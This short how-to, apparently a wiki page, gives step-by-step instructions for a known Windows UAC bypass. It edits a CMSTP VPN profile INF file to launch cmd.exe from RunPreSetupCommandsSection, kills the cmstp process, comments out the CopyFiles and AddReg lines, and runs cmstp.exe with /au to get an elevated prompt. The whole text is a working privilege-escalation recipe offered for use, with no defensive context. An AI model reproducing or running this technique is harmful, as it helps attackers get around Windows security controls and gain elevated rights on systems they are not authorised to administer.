If you have the profile files already, you can proceed. If not, go to the child page and create a profile first!

1. Create a folder on the root of your C: drive called CMSTP.

2. Copy the CorpVPN.inf file to the folder exactly.

3. Now open the inf file in Notepad and scroll down to the RunPreSetupCommandsSection and add these two lines of code (The first line is the command you want to run elevated):
c:\windows\system32\cmd.exe
taskkill /IM cmstp.exe /F

4. You also need to comment out two lines with ;.
CopyFiles=Xnstall.CopyFiles, Xnstall.CopyFiles.ICM
AddReg=Xnstall.AddReg.AllUsers

5. Now if you run the following command and click ok you will get an elevated prompt:
C:\Windows\System32\cmstp.exe c:\cmstp\corpvpn.inf /au
